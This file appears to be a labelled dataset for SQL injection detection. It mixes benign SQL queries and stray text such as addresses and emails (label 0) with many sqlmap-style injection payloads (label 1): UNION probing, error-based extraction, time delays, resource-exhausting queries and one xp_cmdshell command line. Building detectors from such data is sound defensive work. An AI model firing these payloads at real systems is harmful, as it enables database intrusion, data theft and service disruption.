Query,Label
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 31078 )  ORDER BY meta_id ASC",0
"-8661"" union all select 5731,5731--",1
"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'lgat' like 'lgat",1
"-1438 where 6759  =  6759 union all select 6759,6759#",1
SELECT * FROM exclaimed,0
SELECT DISTINCT lay FROM paid,0
SELECT tool FROM coffee,0
"SELECT * FROM mother WHERE improve BETWEEN ""greatest"" AND    ""circle""",0
wyle@designworld.us,0
SELECT * FROM bell WHERE piano LIKE '%took%',0
-8264%'  )   order by 1#,1
"avinguda castellot, 116,",0
" select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",1
"1'+  (  select bptu where 7356  =  7356   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'",1
zahira,0
1'  )   as bihs where 4197  =  4197,1
" SELECT * FROM stiff ORDER BY dollar, steady",0
"1"" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
virge,0
-2429%' or 6890  =  5846,1
SELECT * FROM speed 3 SELECT * FROM listen,0
SELECT MIN ( cent )  AS just FROM just,0
"1"" where 4294  =  4294 and make_set  (  2543  =  7988,7988  )  --",1
"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
v433g3o5i6r79,0
DELETE FROM closely WHERE below = 'higher',0
"1%' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",1
"   SELECT cap, meal, hungry FROM captured WHERE pony  IS NULL",0
SELECT border,0
c/ gomera 148 3?e,0
"1'   )    )    as gqzy where 2312  =  2312 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM roll FETCH FIRST 50 PERCENT ROWS ONLY,0
 UPDATE doing SET die = 'damage'WHERE harbor = 'heat',0
1'+  (  select 'vtyw' where 7950  =  7950 order by 1--,1
"  SELECT nationID AS ID, bear AS silk FROM row",0
SELECT * FROM season FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM canal,0
9.35728E+15,0
6a0ato,0
21392437e,0
"1%'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  '%'  =  '",1
SELECT * FROM colony  WHERE cook = everybody,0
"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",1
hernani,0
"1"" where 8241  =  8241 union all select null,null,null#",1
1'  )   where 3861  =  3861,1
" SELECT COUNT ( CustomerID ) , Country FROM Customers GROUP BY Country  ORDER BY COUNT ( CustomerID )  DESC;",0
SELECT AVG ( Price ) FROM breathe,0
SELECT * FROM quite WHERE few = 'tobacco' LIMIT 3,0
SELECT * FROM metal FETCH FIRST 3 ROWS ONLY,0
"  SELECT MOD ( 18, 4 ) ;",0
SELECT AVG ( Price ) FROM start,0
"1   )    )    as gobw where 3496  =  3496 union all select null,null,null,null,null,null,null,null,null--",1
SELECT * FROM tone WHERE mathematics BETWEEN '1996-07-01' AND '1996-07-31',0
1   )    )    as zoso where 3633  =  3633,1
SELECT church FROM field UNION ALL SELECT model FROM watch ORDER BY joy,0
SELECT * FROM yes WHERE certainly IN  ( SELECT heard FROM track ) ,0
SELECT TOP 3 * FROM fruit WHERE met = 'religious' SELECT * FROM addition,0
SELECT ball ( s FROM being RIGHT JOIN,0
 (  2329  =  4209  )  *1,1
1 where 4787  =  4787,1
calle benifallim 97 10?e,0
"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",1
SELECT AVG ( ants ) FROM nothing SELECT SUM ( human ) ,0
SELECT AVG ( plenty ) FROM serious SELECT SUM ( suggest ) ,0
1' and sleep  (  5  )  #,1
SELECT * FROM basket FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM anywhere WHERE am = 'everything'  OR bigger = 'dropped',0
SELECT * FROM sides WHERE including = 'tobacco'  OR gone = 'father',0
SELECT COUNT ( DISTINCT breathe )  FROM turn,0
"grupo fuensanta 197, 12?a",0
"1""  )   as piwi where 2918  =  2918",1
SELECT hot ( s )  FROM distant SELECT rose FROM area,0
"1%'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   '%'  =  '",1
"carretera ribas matama 160,",0
"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""zwov""  =  ""zwov",1
SELECT tool ( s )  FROM gray UNION ALL,0
rond,0
dudas,0
"  SELECT * FROM all WHERE better NOT IN  ( 'general', 'square', 'fox' )  ",0
"  SELECT * FROM heard WHERE above NOT IN  ( 'add', 'native', 'writing' )  ",0
SELECT * FROM dozen  WHERE screen NOT LIKE '[combination]%',0
"-1763%"" or   (  8459  =  8459  )  *4906 and ""%""  =  """,1
corulln,0
"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
SELECT * FROM Customers GO;  EXEC SelectAllCustomers;,0
SELECT * FROM [Brazil Customers]; CREATE OR REPLACE VIEW [Brazil Customers] AS,0
1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'ykjs' like 'ykjs,1
SELECT * FROM nation WHERE job = 'roll' LIMIT 3,0
7650,0
"camino elorrieta, 193, 2a",0
"-1218' union all select 2663,2663,2663,2663--",1
"1""   )    )    as hiuf where 3277  =  3277 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
522,0
fontihoyuelo,0
rasmia,0
1'||  (  select 'lxyu' from dual where 5789  =  5789 union all select null#,1
SELECT MIN ( repeat )  AS chemical FROM rain,0
"  SELECT * FROM simply WHERE rush NOT IN  ( 'pride', 'general', 'hold' )  ",0
SELECT COUNT ( go ) FROM throat,0
c/ grabador david roberts 154 1-h,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ||'",1
SELECT * FROM hungry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM range,0
"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",1
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
vartan,0
select   (  case when   (  4205  =  9574  )   then 4205 else 1/  (  select 0  )   end  )  --,1
SELECT COUNT ( son ) FROM remarkable,0
SELECT * FROM inch WHERE five = 'strike' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM particularly WHERE price = 'railroad'  OR identity = 'noted',0
2366,0
"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT * FROM writing FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM according,0
SELECT fast ( s )  FROM own UNION ALL,0
"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",1
"-2054%""   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,1
lohr@show.nom.ad,0
SELECT * FROM range WHERE syllable = 'sides',0
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_wp_wps_bg_non_library_sync_1_process_lock' LIMIT 1,0
"   SELECT whether, arrange, problemFROM fear WHERE addition  IS NOT NULL",0
requisitorio,0
1'   )    )    as bbdf where 1327  =  1327,1
"1""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""mlld"" like ""mlld",1
SELECT COUNT ( tinID ) FROM satisfied,0
calle bendicion 160,0
gina,0
SELECT daily ( s )  FROM shorter LEFT JOIN,0
6.27383E+15,0
"1   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8814  =  8814",1
DELETE FROM charge,0
select sleep  (  5  )   and   (  '%'  =  ',1
SELECT AVG ( alone ) FROM sea,0
SELECT TOP 3 * FROM belong WHERE old = 'closer' SELECT * FROM him,0
 UPDATE quick SET planning = 'under'WHERE another = 'of',0
"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'cotv' like 'cotv",1
SELECT * FROM mine ORDER BY so,0
raian,0
mortensen@look2fly.nr,0
eseyente,0
select sleep  (  5   )    )   ||',1
"1""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ynwr"" like ""ynwr",1
"1  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""%""  =  """,1
" SELECT * FROM label ORDER BY rocket, particularly",0
lacavex lafont,0
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'drui' like 'drui",1
reilly-pidgeon@interpretacion-diccionario-y-significado-de-los-s,0
bic9spide,0
SELECT AVG ( shallow ) FROM donkey,0
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
or 0  =  0 #,1
" SELECT * FROM helpful ORDER BY new, new",0
ajoy,0
"-4346'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
garabatos,0
SELECT breathing ( s )  FROM blood UNION,0
"-7345%"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,1
"c/ salvatella, 98 11?h",0
SELECT * FROM biggest,0
mo3tren04,0
"1%' union all select null,null--",1
SELECT DISTINCT dangerous FROM give,0
"   SELECT identity, applied, laidFROM strip WHERE mathematics  IS NOT NULL",0
"calle el pilar s/n,",0
10262643c,0
"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT * FROM answer WHERE coffee = 'pool'  AND City = 'fully',0
SELECT * FROM fill WHERE want = 'fellow'  OR mad = 'making',0
albercoque,0
e41t8r,0
lev@ozlon.ke,0
lecompte,0
60928646j,0
" select * from users where id  =  1 or ""  (  _"" or 1  =  1 -- 1",1
SELECT COUNT ( plateID ) FROM deer,0
03344221k,0
6180,0
SELECT * FROM swing WHERE cross = 'straight',0
"1""  )   as mohv where 2171  =  2171 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1
1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',1
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""nzhj"" like ""nzhj",1
-6179   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   7732  =  7732,1
fasti-dio,0
SELECT ATAN ( 2.5 ) ;,0
"INSERT INTO thumb ( poem, silence, tonight, active, shoot, fort )  VALUES  ( 'clothing', 'shore'. canal', 'vapor', 'task', 'either', 'unless' )  ",0
SELECT fire ( s )  FROM see FULL OUTER JOIN,0
84826588n,0
"1%""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
lehar,0
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_timeout_doing_cron' LIMIT 1,0
" SELECT * FROM own ORDER BY highest, improve",0
"-5830  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1
"1""   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""vcjt"" like ""vcjt",1
1478,0
SELECT * FROM where WHERE add NOT LIKE 'engine%',0
1%'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   '%'  =  ',1
SELECT spring ( s )  FROM salmon LEFT JOIN,0
SELECT vessels FROM of,0
SELECT * FROM kept FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM tell WHERE article = 'value' LIMIT 3,0
SELECT size ( s ) FROM skill INNER JOIN,0
SELECT COUNT ( improve )  FROM control,0
select case when 5346  =  8272 then 1 else null end--,1
batido,0
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'hqqj'  =  'hqqj",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367845 )  ORDER BY meta_id ASC",0
SELECT AVG ( lips ) FROM simply,0
"1'||  (  select 'rfjl' where 2476  =  2476 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",1
"1"" where 9521  =  9521 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",1
SELECT Count ( * )  AS cutting,0
SELECT * FROM studied  WHERE edge = bow,0
-5585' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1
50,0
SELECT * FROM strange WHERE theory IN  ( SELECT engineer FROM slave ) ,0
"1""  )   where 2016  =  2016 and   (  1547  =  2093  )  *2093--",1
"avenida baraain, 51, 1?h",0
" SELECT * FROM sets ORDER BY torn ASC, cat DESC",0
spnola ballado,0
"1""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""zyeo"" like ""zyeo",1
nogueras,0
"-5109   )    )     )   or make_set  (  6627  =  7331,7331  )   and    (    (     (  9466  =  9466",1
binaced,0
select sleep  (  5  )   and   (  1435  =  1435,1
1'  )   as ibaw where 2130  =  2130 and 9198  =  9198--,1
"1%""   )    )    union all select null,null,null--",1
"  SELECT boardID AS ID, advice AS quite FROM automobile",0
-3597'   )    )    order by 1--,1
SELECT MAX (  column_name  )  FROM table_name WHERE condition ;,0
DELETE FROM class WHERE rubbed = 'sold',0
SELECT * FROM bush WHERE five NOT LIKE 'bite%',0
1  )   where 6884  =  6884 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   '%'  =  '",1
 UPDATE replace SET smooth = 'instrument'WHERE rapidly = 'cream',0
SELECT * FROM expect WHERE nest BETWEEN '1996-07-01' AND '1996-07-31',0
"1%""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """,1
"1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",1
SELECT * FROM alone WHERE    NOT kitchen = 'or',0
estorbar,0
SELECT * FROM continent FETCH FIRST 3 ROWS ONLY,0
SELECT small ( s )  FROM force LEFT JOIN,0
-2129'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'eutm' like 'eutm,1
SELECT * FROM everyone FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM both,0
SELECT * FROM appropriate WHERE needed = 'satellites' FETCH FIRST 3 ROWS ONLY,0
"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",1
"1""  )   where 1416  =  1416 union all select null,null,null#",1
"1%""   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   ""%""  =  """,1
select   (  case when   (  9246  =  6326  )   then 9246 else 9246*  (  select 9246 from mysql.db  )   end  )  #,1
SELECT COUNT ( angry ) FROM everywhere,0
"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",1
"1' union all select null,null,null,null,null,null,null#",1
57584234p,0
"1%""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
1capa2ad*or,0
bocana$da,0
27837,0
1 where 7890  =  7890 or sleep  (  5  )  --,1
SELECT * FROM rush ORDER BY important,0
keseris,0
SELECT TOP 50 PERCENT * FROM picture SELECT * FROM rod FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM spirit,0
SELECT AVG ( bark ) FROM minerals SELECT SUM ( brown ) ,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 7515 )  ORDER BY meta_id ASC",0
drop-box,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 239190 )  ORDER BY meta_id ASC",0
SELECT TOP 50 PERCENT * FROM vote SELECT * FROM simplest FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM test,0
"   SELECT tip, half, drivingFROM physical WHERE usual  IS NOT NULL",0
SELECT * FROM Customers  WHERE Country = 'Germany' AND City = 'Berlin';,0
SELECT * FROM ship  WHERE dinner NOT LIKE '[sentence]%',0
"1' in boolean mode  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  #",1
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",1
SELECT * FROM it WHERE native BETWEEN 'milk' AND 'sitting',0
SELECT trace ( s )  FROM firm UNION,0
FROM  ( SELECT DISTINCT mountain FROM uncle ) ,0
SELECT DISTINCT shape FROM carbon,0
SELECT * FROM wp_posts WHERE ID  =  262331 LIMIT 1,0
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'eovg' like 'eovg",1
SELECT * FROM spider WHERE express = 'improve'  AND  ( wonderful = 'battle' OR gradually = 'west' ) ,0
antirreglamentaria,0
SELECT say ( s )  FROM camera FULL OUTER JOIN,0
"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",1
SELECT * FROM negative ORDER BY lost,0
"1   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   6010  =  6010",1
"1%"" union all select null,null,null,null,null,null,null,null,null,null--",1
1 union all select null--,1
"SELECT * FROM band WHERE sad BETWEEN ""cover"" AND    ""without""",0
losar de la vera,0
SELECT kept ( s )  FROM old SELECT actual ( s ) ,0
"1""   )    )     )   order by 1#",1
SELECT * FROM slowly,0
"1'   )    )    as uvxv where 6663  =  6663 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1%'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  '",1
"calle las artes, 90,",0
SELECT * FROM nothing WHERE indeed = 'mass'  AND City = 'life',0
DELETE FROM lead WHERE thus = 'trouble',0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,1
"   SELECT fur, electric, person FROM felt WHERE president  IS NULL",0
SELECT * FROM office  WHERE equator NOT LIKE '[still]%',0
"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'vbda' like 'vbda",1
SELECT kept ( s )  FROM powder UNION ALL,0
"1'||  (  select 'ltqo' where 9080  =  9080 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1
DELETE FROM check WHERE carry = 'yet',0
SELECT * FROM magnet WHERE four LIKE '%fat%',0
chimillas,0
kava_ivic@comercioenlacalle.info,0
1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'trzi'  =  'trzi,1
SHOW FULL COLUMNS FROM `wp_options`,0
1  )   where 1333  =  1333 order by 1--,1
SELECT COUNT ( tightID ) FROM noted,0
"1   )    )    as vycb where 3524  =  3524 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"calle romeral, 143, 7?h",0
clever,0
SELECT look ( s FROM mostly RIGHT JOIN,0
"1'||  (  select 'jzwq' where 3289  =  3289 union all select null,null,null,null,null,null,null#",1
SELECT TOP 3 * FROM sent SELECT * FROM evening 3SELECT * FROM cloud,0
SELECT * FROM torn  WHERE zoo NOT LIKE '[dead]%',0
3.94593E+15,0
SELECT edge ( s )  FROM tree FULL OUTER JOIN,0
"  SELECT ADDTIME ( ""2017-06-15 09:34:21.000001"", ""2:10:5.000003"" ) ;",0
1'+  (  select kzgg where 5070  =  5070,1
"1   )    )    as avdz where 1881  =  1881 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_3_text' LIMIT 1,0
SELECT * FROM see FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM our,0
SELECT TOP 50 PERCENT * FROM flight SELECT * FROM notice FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wild,0
"1""  )   as lrew where 6067  =  6067 union all select null,null,null,null,null,null,null#",1
schauer,0
06363808f,0
lesaca clar,0
"  SELECT HOUR ( ""838:59:59"" ) ;",0
SELECT needle ( s )  FROM catch,0
SELECT care ( s FROM charge RIGHT JOIN,0
"1   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   3038  =  3038",1
"-1031%"" union all select 6832,6832,6832,6832#",1
asturias,0
SELECT TOP 3 * FROM before,0
"1"" where 1982  =  1982",1
"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '%'  =  '",1
FROM  ( SELECT DISTINCT tool FROM coffee ) ,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_number_of_support_family' LIMIT 1,0
"1"" union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT nation ( s ) FROM spend INNER JOIN,0
1.97346E+15,0
1.3438E+15,0
